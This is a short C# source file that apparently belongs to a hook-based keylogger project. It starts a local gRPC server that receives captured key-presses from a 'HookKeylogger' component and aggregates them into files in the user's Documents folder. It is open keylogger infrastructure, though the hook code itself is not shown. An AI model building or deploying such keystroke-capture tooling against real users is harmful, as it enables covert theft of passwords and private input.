using HookKeylogger.Base;
using System;
using System.Collections.Concurrent;
using System.Threading;

namespace KeypressAggregator
{
    class Program
    {
        ///<summary>
        ///Aggregates key-presses sent from the hook key logger.
        ///</summary>
        static void Main(string[] args)
        {
            // The path of the keylog file
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\keylog";
            // The new file that holds the extracted data
            string newFile = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\data";
            int port = 4567;
            string addr = "localhost";

            ConcurrentQueue<KeyPress> inputbuffer = new ConcurrentQueue<KeyPress>();
            Grpc.Core.Server server = new Grpc.Core.Server
            {
                Services = { HookKeylogger.Base.KerPressAggergator.BindService(new KeyPressAggergatorImpl(inputbuffer)) },
                Ports = { new Grpc.Core.ServerPort(addr, port, Grpc.Core.ServerCredentials.Insecure) }
            };

            KeyPressAggergator ksa = new KeyPressAggergator(inputbuffer);

            Thread aggergationThread = new Thread(new ThreadStart(ksa.Scan));
            aggergationThread.Start();
            server.Start();

            Console.WriteLine("Key-Press Aggergation server listening on " +addr + ":" + port);
            Console.WriteLine("Press any key to stop the aggregation server...");
            Console.ReadKey();

            aggergationThread.Abort();
            aggergationThread.Join();
            server.ShutdownAsync();
        }
    }
}
